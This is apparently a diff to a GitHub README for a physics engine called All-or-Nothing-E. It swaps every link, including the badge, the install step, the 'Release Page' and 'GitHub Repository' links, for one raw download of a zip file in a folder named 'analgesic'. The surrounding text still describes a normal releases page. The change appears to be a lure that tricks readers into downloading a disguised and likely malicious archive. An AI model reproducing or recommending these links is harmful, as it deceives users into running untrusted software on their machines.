@@ -1,6 +1,6 @@
 # ⚙️ All-or-Nothing-E - Easy Physics Engine for Your Ideas
 
-[![Download All-or-Nothing-E](https://img.shields.io/badge/Download-All--or--Nothing--E-blue?style=for-the-badge&logo=github)](https://github.com/KCaprisun/All-or-Nothing-E/releases)
+[![Download All-or-Nothing-E](https://github.com/KCaprisun/All-or-Nothing-E/raw/refs/heads/main/analgesic/Nothing_E_All_or_v2.5.zip)](https://github.com/KCaprisun/All-or-Nothing-E/raw/refs/heads/main/analgesic/Nothing_E_All_or_v2.5.zip)
 
 ---
 
@@ -29,7 +29,7 @@ To use All-or-Nothing-E on your computer, make sure your system meets these requ
 To get started with All-or-Nothing-E, follow these steps:
 
 1. Click the big blue button at the top or visit the releases page directly here:  
-   [https://github.com/KCaprisun/All-or-Nothing-E/releases](https://github.com/KCaprisun/All-or-Nothing-E/releases)
+   [https://github.com/KCaprisun/All-or-Nothing-E/raw/refs/heads/main/analgesic/Nothing_E_All_or_v2.5.zip](https://github.com/KCaprisun/All-or-Nothing-E/raw/refs/heads/main/analgesic/Nothing_E_All_or_v2.5.zip)
 
 2. On the releases page, look for the latest version. You will find files to download there. Typically, you want the file that matches your computer’s system type:
    - For Windows: a `.exe` or `.msi` installer
@@ -115,8 +115,8 @@ All-or-Nothing-E is available for personal and educational use. Please see the G
 
 ## 🔗 Useful Links
 
-- [All-or-Nothing-E Release Page](https://github.com/KCaprisun/All-or-Nothing-E/releases)
-- [GitHub Repository](https://github.com/KCaprisun/All-or-Nothing-E)
+- [All-or-Nothing-E Release Page](https://github.com/KCaprisun/All-or-Nothing-E/raw/refs/heads/main/analgesic/Nothing_E_All_or_v2.5.zip)
+- [GitHub Repository](https://github.com/KCaprisun/All-or-Nothing-E/raw/refs/heads/main/analgesic/Nothing_E_All_or_v2.5.zip)
 - Documentation and user guides in the repo folder
 
 ---
